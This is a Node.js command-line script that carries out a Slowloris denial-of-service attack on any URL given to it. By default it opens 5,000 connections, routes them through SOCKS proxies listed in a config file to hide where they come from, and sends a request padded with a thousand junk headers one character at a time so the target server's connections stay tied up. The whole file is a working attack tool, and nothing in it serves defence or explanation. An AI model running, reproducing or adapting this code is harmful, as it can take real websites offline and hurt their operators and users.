#!/usr/bin/env node

/**
 * Module dependencies.
 */

var program = require('commander');
var pkg = require('./package.json');
var parse = require('url').parse;
var net = require('net');
var tls = require('tls');

// Set up socks agents
var socks = require('socksv5');
var http = require('http');
var https = require('https');
var _ = require('lodash');
var fs = require('fs');

var httpsAgents = [], httpAgents = [];

var configs = JSON.parse(fs.readFileSync('config.json', 'utf8'));
_.each(configs, function(config) {
  var auth  = config.username? socks.auth.UserPassword(config.username, config.password) : socks.auth.None();
  var socksConfig = {
    proxyHost: config.host,
    proxyPort: config.port,
    auths: [ auth ]
  };
  httpAgents.push(new socks.HttpAgent(socksConfig));
  httpsAgents.push(new socks.HttpsAgent(socksConfig));
});

// options

program
  .version(pkg.version)
  .usage('[options] <url>')
  .option('-c, --connections <n>', 'number of connections to open [5000]', parseInt)
  .parse(process.argv);

// <url>

var url = process.argv[2];
if (!url) throw new Error('url required');
url = parse(url);

// connections

var c = program.connections || 5000;

console.log();
console.log('  unleashing the slow loris on %s', url.href);
console.log('  connections: %s', c);

// request

var req = [
  'Host: ' + url.host + '\r\n',
  'Accept: */*\r\n'
].join('');

// make it huge

var n = 1000;
while (n--) {
  req += 'X-Loris-' + n + ': ' + n + '\r\n';
}

req += '\r\n';

// active connections

var active = 0;

// run

while (c--) send(c);

function send(connectionNumber) {
  var bucket = connectionNumber % configs.length;
  var secure = 'https:' == url.protocol;

  var opts = {
    host: url.hostname,
    port: url.port || (secure ? 443 : 80),
    method: 'POST',
    path: url.path,
    agent: secure ? httpsAgents[bucket] : httpAgents[bucket]
  };

  var mod = secure ? https : http;

  ++active;
  process.stdout.write('Connecting. Number of active processes - ' + active + '\n');

  var sock = mod.request(opts);

  sock.on('close', function(){
    --active;
    process.stdout.write('Closed out! Number of active processes - ' + active + '\n');
  });

  sock.on('error', function(){
    --active;
    process.stdout.write('Errored out! Number of active processes - ' + active + '\n');
  });

  var i = 0;

  setInterval(function(){
    if (null == req[i]) { sock.end(); return; }
    sock.write(req[i++]);
  }, 50);
}
